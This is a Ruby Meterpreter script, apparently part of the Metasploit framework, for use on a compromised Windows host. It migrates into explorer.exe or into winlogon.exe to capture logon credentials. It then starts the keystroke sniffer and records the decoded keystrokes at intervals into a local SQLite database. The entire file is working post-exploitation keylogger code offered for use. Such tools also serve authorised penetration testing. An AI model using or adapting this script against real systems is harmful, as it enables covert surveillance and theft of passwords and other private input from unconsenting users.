#!/usr/bin/env ruby
require 'sqlite3'
#
#Meterpreter script for monitoring and capturing Keystrokes and
#saving them in to  a sqlite db.
#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
session = client

#Get Hostname
host,port = session.tunnel_peer.split(':')

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.config_directory, 'logs', 'keylogrecorder', host + filenameinfo )

# Create the log directory
::FileUtils.mkdir_p(logs)

#logfile name
logfile = logs + ::File::Separator + host + filenameinfo + ".db"

#Interval for collecting Keystrokes in seconds
keytime = 30

#Type of capture
captype = 0

# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "Help menu."],
  "-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds."],
  "-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0."]
  
)

#Function to Migrate in to Explorer process to be able to interact with desktop
def explrmigrate(session,captype)
	begin
		print_status("Migrating process...")
		if captype.to_i == 0
			process2mig = "explorer.exe"
		elsif captype.to_i == 1
			process2mig = "winlogon.exe"
		else
			process2mig = "explorer.exe"
		end
		# Actual migration
		session.sys.process.get_processes().each do |x|
			if (process2mig.index(x['name'].downcase))
				print_status("\t#{process2mig} Process found, migrating..")
				session.core.migrate(x['pid'].to_i)
				print_status("Migration Successful!!")
			end
		end
		return true
	rescue
		print_status("Failed to migrate process!")
		return false
	end
end

#Function for starting the keylogger
def startkeylogger(session)
	begin
		#print_status("Grabbing Desktop Keyboard Input...")
		#session.ui.grab_desktop
		print_status("Starting the keystroke sniffer...") 
		session.ui.keyscan_start
		return true
	rescue
		print_status("Failed to start Keylogging!")
		return false
	end
end

#Funtion for Collecting Capture
def keycap(session, keytime, logfile)
	begin
    		rec = 1
		#Creating DB for captured keystrokes
		db = SQLite3::Database.new( logfile )
		print_status("Keystrokes being saved in to #{logfile}")
		#Creating table for captured keystrokes
		db.execute("create table keystrokes (tkey INTEGER PRIMARY KEY,data TEXT,timeEnter DATE)")
		    #Inserting keystrokes every number of seconds specified
		    print("[*] Recording .")
		    while rec == 1
		      	#getting Keystrokes
		      	data = session.ui.keyscan_dump
		      	outp = ""
		      	data.unpack("n*").each do |inp|
		        	      fl = (inp & 0xff00) >> 8
		        	      vk = (inp & 0xff)
		        	      kc = VirtualKeyCodes[vk]
	
		        	      f_shift = fl & (1<<1)
		        	      f_ctrl  = fl & (1<<2)
		        	      f_alt   = fl & (1<<3)

		        	      if(kc)
		        	              name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
		        	              case name
		        	             when /^.$/
		        	                      outp << name
		        	              when /shift|click/i
		        	              when 'Space'
		        	                      outp << " "
		        	              else
		        	                      outp << " <#{name}> "
		        	              end
		        	      else
		        	              outp << " <0x%.2x> " % vk
		        	      end
			end
		        sleep(2)
		        db.execute( "insert into keystrokes (data,timeEnter) values (?,?)", outp,::Time.now.strftime("%Y%m%d.%M%S"))
		        print(".")
		        sleep(keytime.to_i)
		     end
		   db.close
	rescue::Exception => e
    print("\n")
		print_status("#{e.class} #{e}")
		db.close
    print_status("Stopping keystroke sniffer...")
		session.ui.keyscan_stop
	end
end
def helpmsg
	print(
    "Keylogger Recorder Meterpreter Script\n" +
    "This script will start the Meterpreter Keylogger and save all keys\n" +
    "in a sqlite3 db for later anlysis. To stop capture hit Ctrl-C\n" +
    "Usage:" +
      @@exec_opts.usage
     )
	
end
# Parsing of Options
helpcall = 0
@@exec_opts.parse(args) { |opt, idx, val|
	case opt

  when "-t"
    keytime = val
  when "-c"    
    captype = val
  when "-h"
    helpmsg
    helpcall = 1
  end

}
if helpcall == 0
	if explrmigrate(session,captype)
		if startkeylogger(session)
			keycap(session, keytime, logfile)
		end
	end
end
